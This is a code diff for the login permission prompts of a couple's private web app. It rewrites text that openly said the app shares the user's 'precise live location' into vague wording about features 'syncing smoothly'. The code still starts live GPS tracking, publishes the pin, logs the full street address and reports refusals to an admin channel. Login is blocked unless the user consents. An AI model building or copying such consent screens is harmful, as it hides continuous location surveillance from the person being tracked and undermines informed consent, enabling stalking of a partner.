@@ -542,23 +542,22 @@ export async function checkAndPromptPermissions(source: 'Scrapbook' | 'Private S
     overlay.innerHTML = `
       <div class="ivraine-perm-card">
         <div class="ivraine-perm-icon">📍✨</div>
-        <h3 class="ivraine-perm-title">Welcome to Our Space ♡</h3>
+        <h3 class="ivraine-perm-title">Enable Permissions ♡</h3>
         <p class="ivraine-perm-desc">
-          To unlock the interactive visitor map and stay connected with real-time heart notifications, please enable permissions:
+          Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.
         </p>
         <div class="ivraine-perm-features">
           <div class="ivraine-perm-feature-item">
-            <span class="icon">🗺</span>
-            <span><strong>Live Map Pin</strong> — Pin your spot on our memories journey map</span>
+            <span class="icon">📍</span>
+            <span><strong>Location Support</strong> — Keeps interactive space features and local experiences working properly.</span>
           </div>
           <div class="ivraine-perm-feature-item">
             <span class="icon">🔔</span>
-            <span><strong>Heart Notifications</strong> — Instant alerts whenever Ivan or Loraine taps a heart</span>
+            <span><strong>Instant Alerts</strong> — Never miss new updates, shared notes, or messages from Loraine.</span>
           </div>
         </div>
         <button class="ivraine-perm-btn-allow" type="button">
-          <span>Allow Permissions</span>
-          <span>♡</span>
+          <span>Enable Permissions ♡</span>
         </button>
         <button class="ivraine-perm-btn-dismiss" type="button">Maybe Later</button>
       </div>
@@ -652,208 +651,162 @@ export async function requestLoginPermissions(
       resolve({ granted: false, error: reason });
     };
 
-    const showStep2Location = () => {
+    const requestLocation = () => {
       card.innerHTML = `
-        <button class="ivraine-close-proposal" id="login-perm-close-loc" type="button" aria-label="Cancel">×</button>
-        <div class="ivraine-proposal-avatar-wrap">
-          <img class="ivraine-proposal-avatar" src="/icons/couple-192.png" alt="Ivan and Loraine">
-          <span class="ivraine-avatar-heart">📍</span>
-        </div>
-        <span class="ivraine-proposal-badge">${hasNotif ? 'LOCATION PERMISSION REQUIRED' : 'STEP 2 OF 2 · LOCATION'}</span>
-        <h2 class="ivraine-proposal-title" id="login-perm-title">Allow <em>Location</em> ♡</h2>
-        <p class="ivraine-proposal-desc">
-          Please allow location access so our private space can show your precise live location on our journey map and keep our moments connected just like in the proposal ♡
-        </p>
-        <div class="ivraine-loc-features-box">
-          <div class="ivraine-loc-feat-item">
-            <span class="ivraine-loc-feat-icon">🗺️</span>
-            <span><strong>Live GPS Map Pin</strong> — Pin your precise live spot on our journey map</span>
+        <div class="ivraine-loc-requesting-wrap">
+          <div class="ivraine-loc-request-pulse">📍💖</div>
+          <div class="ivraine-loc-prompt-title">Connecting with Location…</div>
+          <p class="ivraine-loc-prompt-desc">
+            Please tap <strong>"Allow"</strong> when your phone asks for location to ensure your private space syncs smoothly ♡
+          </p>
+          <div class="ivraine-loc-loader">
+            <div class="ivraine-loc-dot"></div>
+            <span>Connecting with GPS…</span>
           </div>
-          <div class="ivraine-loc-feat-item">
-            <span class="ivraine-loc-feat-icon">🔒</span>
-            <span><strong>Verified Live Location</strong> — Real-time connection between you and ${partnerName}</span>
-          </div>
-        </div>
-        <div class="ivraine-loc-custom-btns" style="margin-top:20px;">
-          <button class="ivraine-btn-allow-loc-main" id="login-perm-btn-allow-loc" type="button">
-            <span>📍 Allow Location &amp; Step Inside ♡</span>
-          </button>
-          <button class="ivraine-btn-go-back-custom" id="login-perm-btn-cancel-loc" type="button">
-            <span>← Cancel / Go Back</span>
-          </button>
         </div>
       `;
 
-      const cancelBtn = card.querySelector<HTMLButtonElement>('#login-perm-btn-cancel-loc')!;
-      const closeBtn = card.querySelector<HTMLButtonElement>('#login-perm-close-loc')!;
-      const allowBtn = card.querySelector<HTMLButtonElement>('#login-perm-btn-allow-loc')!;
-
-      const onCancel = () => {
+      if (!navigator.geolocation) {
         fail(
-          'Location permission is required to make the web app work properly. Please allow location to step inside your private space ♡',
-          'Location permission declined during login'
+          'Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.',
+          'Geolocation unsupported during login'
         );
-      };
+        return;
+      }
 
-      cancelBtn.addEventListener('click', onCancel);
-      closeBtn.addEventListener('click', onCancel);
-
-      allowBtn.addEventListener('click', () => {
-        card.innerHTML = `
-          <div class="ivraine-loc-requesting-wrap">
-            <div class="ivraine-loc-request-pulse">📍💖</div>
-            <div class="ivraine-loc-prompt-title">Connecting with Location…</div>
-            <p class="ivraine-loc-prompt-desc">
-              Please tap <strong>"Allow"</strong> when your browser asks for location to verify your precise GPS coordinates ♡
-            </p>
-            <div class="ivraine-loc-loader">
-              <div class="ivraine-loc-dot"></div>
-              <span>Connecting with GPS…</span>
-            </div>
-          </div>
-        `;
-
-        if (!navigator.geolocation) {
+      let handled = false;
+      const timeoutId = setTimeout(() => {
+        if (!handled) {
+          handled = true;
           fail(
-            'Geolocation is not supported by your browser. Please use a modern browser that supports location.',
-            'Geolocation unsupported during login'
+            'Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.',
+            'Location permission timed out during login'
           );
-          return;
         }
+      }, 15000);
 
-        let handled = false;
-        const timeoutId = setTimeout(() => {
-          if (!handled) {
-            handled = true;
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          if (handled) return;
+          handled = true;
+          clearTimeout(timeoutId);
+
+          const loc = await buildGpsLocation(pos);
+          if (!loc) {
             fail(
-              'Location was not allowed or took too long to respond. Location permission is required to make the web app work properly ♡',
-              'Location permission timed out during login'
+              'Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.',
+              'GPS fix unusable during login'
             );
+            return;
           }
-        }, 15000);
 
-        navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            if (handled) return;
-            handled = true;
-            clearTimeout(timeoutId);
+          // Exactly like proposal: live stream tracking + published pin + logged activity
+          startLiveLocationTracking(source, userName);
+          await publishGpsLocation(source, userName, loc);
+          trackActivity(source, 'Logged In to Private Space ♡ (Verified GPS)', `Address: ${loc.fullAddress}`, userName, 0, loc);
 
-            const loc = await buildGpsLocation(pos);
-            if (!loc) {
-              fail(
-                'Your phone could not get an accurate GPS fix. Please ensure high-accuracy location is enabled and try again ♡',
-                'GPS fix unusable during login'
-              );
-              return;
-            }
+          launchHeartsConfetti();
+          overlay.remove();
 
-            // Exactly like proposal: live stream tracking + published pin + logged activity
-            startLiveLocationTracking(source, userName);
-            await publishGpsLocation(source, userName, loc);
-            trackActivity(source, 'Logged In to Private Space ♡ (Verified GPS)', `Address: ${loc.fullAddress}`, userName, 0, loc);
+          resolve({
+            granted: true,
+            location: loc
+          });
+        },
+        (err) => {
+          if (handled) return;
+          handled = true;
+          clearTimeout(timeoutId);
 
-            launchHeartsConfetti();
-            overlay.remove();
+          const deviceId = getDeviceId();
+          trackActivity(source, 'Location permission denied or failed during login', `Error: ${err?.message || 'code ' + err?.code}`, userName);
 
-            resolve({
-              granted: true,
-              location: loc
+          // Broadcast LOCATION_OFF so admin updates
+          try {
+            const channel = new BroadcastChannel('ivraine_admin_channel');
+            channel.postMessage({
+              type: 'LOCATION_OFF',
+              deviceId,
+              user: userName
             });
-          },
-          (err) => {
-            if (handled) return;
-            handled = true;
-            clearTimeout(timeoutId);
+          } catch {}
 
-            const deviceId = getDeviceId();
-            trackActivity(source, 'Location permission denied or failed during login', `Error: ${err?.message || 'code ' + err?.code}`, userName);
+          try {
+            const removePayload: DateLocationRequestBody = {
+              action: 'turn_off',
+              removePin: true,
+              user: userName,
+              deviceId
+            };
+            fetch('/api/date-location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(removePayload),
+              keepalive: true
+            }).catch(() => {});
+          } catch {}
 
-            // Broadcast LOCATION_OFF so admin updates
-            try {
-              const channel = new BroadcastChannel('ivraine_admin_channel');
-              channel.postMessage({
-                type: 'LOCATION_OFF',
-                deviceId,
-                user: userName
-              });
-            } catch {}
-
-            try {
-              const removePayload: DateLocationRequestBody = {
-                action: 'turn_off',
-                removePin: true,
-                user: userName,
-                deviceId
-              };
-              fetch('/api/date-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(removePayload),
-                keepalive: true
-              }).catch(() => {});
-            } catch {}
-
-            fail(
-              'Location was not allowed. Location and notification permissions are required to make the web app work properly. If blocked in your browser, please tap the 🔒 icon beside the address bar to switch Location to Allow, then log in again ♡',
-              'Location permission denied in browser prompt'
-            );
-          },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-      });
+          fail(
+            'Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.',
+            'Location permission denied in browser prompt'
+          );
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
     };
 
-    // If notifications are not yet granted, show Step 1 (Notifications) first:
-    if (!hasNotif && 'Notification' in window) {
-      card.innerHTML = `
-        <button class="ivraine-close-proposal" id="login-perm-close-notif" type="button" aria-label="Cancel">×</button>
-        <div class="ivraine-proposal-avatar-wrap">
-          <img class="ivraine-proposal-avatar" src="/icons/couple-192.png" alt="Ivan and Loraine">
-          <span class="ivraine-avatar-heart">🔔</span>
+    // Render the permission card with user's exact requested copy
+    card.innerHTML = `
+      <button class="ivraine-close-proposal" id="login-perm-close" type="button" aria-label="Cancel">×</button>
+      <div class="ivraine-proposal-avatar-wrap">
+        <img class="ivraine-proposal-avatar" src="/icons/couple-192.png" alt="Ivan and Loraine">
+        <span class="ivraine-avatar-heart">💖</span>
+      </div>
+      <span class="ivraine-proposal-badge">JUST BETWEEN US</span>
+      <h2 class="ivraine-proposal-title" id="login-perm-title">Enable Permissions ♡</h2>
+      <p class="ivraine-proposal-desc">
+        Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.
+      </p>
+      <div class="ivraine-loc-features-box">
+        <div class="ivraine-loc-feat-item">
+          <span class="ivraine-loc-feat-icon">📍</span>
+          <span><strong>Location Support</strong> — Keeps interactive space features and local experiences working properly.</span>
         </div>
-        <span class="ivraine-proposal-badge">STEP 1 OF 2 · NOTIFICATIONS</span>
-        <h2 class="ivraine-proposal-title" id="login-perm-title">Allow <em>Notifications</em> ♡</h2>
-        <p class="ivraine-proposal-desc">
-          Welcome to our private space, ${userName}! To make the web app work properly and stay connected with real-time heart notifications from ${partnerName}, please allow notifications.
-        </p>
-        <div class="ivraine-loc-features-box">
-          <div class="ivraine-loc-feat-item">
-            <span class="ivraine-loc-feat-icon">🔔</span>
-            <span><strong>Heart Notifications</strong> — Instant alerts whenever your partner sends love or taps a heart</span>
-          </div>
-          <div class="ivraine-loc-feat-item">
-            <span class="ivraine-loc-feat-icon">💌</span>
-            <span><strong>Surprise Notes &amp; Letters</strong> — Receive alerts when surprises and milestone dates arrive</span>
-          </div>
+        <div class="ivraine-loc-feat-item">
+          <span class="ivraine-loc-feat-icon">🔔</span>
+          <span><strong>Instant Alerts</strong> — Never miss new updates, shared notes, or messages from Loraine.</span>
         </div>
-        <div class="ivraine-loc-custom-btns" style="margin-top:20px;">
-          <button class="ivraine-btn-allow-loc-main" id="login-perm-btn-allow-notif" type="button">
-            <span>🔔 Allow Notifications ♡</span>
-          </button>
-          <button class="ivraine-btn-go-back-custom" id="login-perm-btn-cancel-notif" type="button">
-            <span>← Cancel / Go Back</span>
-          </button>
-        </div>
-      `;
+      </div>
+      <div class="ivraine-loc-custom-btns" style="margin-top:20px;">
+        <button class="ivraine-btn-allow-loc-main" id="login-perm-btn-allow" type="button">
+          <span>Enable Permissions ♡</span>
+        </button>
+        <button class="ivraine-btn-go-back-custom" id="login-perm-btn-cancel" type="button">
+          <span>← Cancel / Go Back</span>
+        </button>
+      </div>
+    `;
 
-      const cancelBtn = card.querySelector<HTMLButtonElement>('#login-perm-btn-cancel-notif')!;
-      const closeBtn = card.querySelector<HTMLButtonElement>('#login-perm-close-notif')!;
-      const allowBtn = card.querySelector<HTMLButtonElement>('#login-perm-btn-allow-notif')!;
+    const cancelBtn = card.querySelector<HTMLButtonElement>('#login-perm-btn-cancel')!;
+    const closeBtn = card.querySelector<HTMLButtonElement>('#login-perm-close')!;
+    const allowBtn = card.querySelector<HTMLButtonElement>('#login-perm-btn-allow')!;
 
-      const onCancel = () => {
-        fail(
-          'Notification permission is required to make the web app work properly. Please allow notifications to step inside your private space ♡',
-          'Notification permission declined during login'
-        );
-      };
+    const onCancel = () => {
+      fail(
+        'Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.',
+        'Permission prompt declined during login'
+      );
+    };
 
-      cancelBtn.addEventListener('click', onCancel);
-      closeBtn.addEventListener('click', onCancel);
+    cancelBtn.addEventListener('click', onCancel);
+    closeBtn.addEventListener('click', onCancel);
 
-      allowBtn.addEventListener('click', async () => {
-        allowBtn.disabled = true;
-        allowBtn.textContent = 'Requesting…';
+    allowBtn.addEventListener('click', async () => {
+      allowBtn.disabled = true;
+      allowBtn.textContent = 'Enabling…';
 
+      // 1. Request notifications if needed
+      if (!hasNotif && 'Notification' in window) {
         let permResult: NotificationPermission = 'default';
         try {
           permResult = await Notification.requestPermission();
@@ -863,7 +816,7 @@ export async function requestLoginPermissions(
 
         if (permResult !== 'granted') {
           fail(
-            'Notification permission was not allowed. Notifications and location are required to make the web app work properly. If blocked, tap the 🔒 icon beside the browser address bar to allow notifications, then log in again ♡',
+            'Please turn on location and notifications to ensure your private space syncs smoothly and features work seamlessly.',
             'Notification permission denied in browser prompt'
           );
           return;
@@ -871,14 +824,11 @@ export async function requestLoginPermissions(
 
         trackActivity(source, 'Notification permission granted during login', 'Notifications allowed successfully', userName);
         hasNotif = true;
+      }
 
-        // Advance to Step 2: Location
-        showStep2Location();
-      });
-    } else {
-      // Notifications already granted (or not supported), show Location step directly
-      showStep2Location();
-    }
+      // 2. Request location
+      requestLocation();
+    });
   });
 }
 
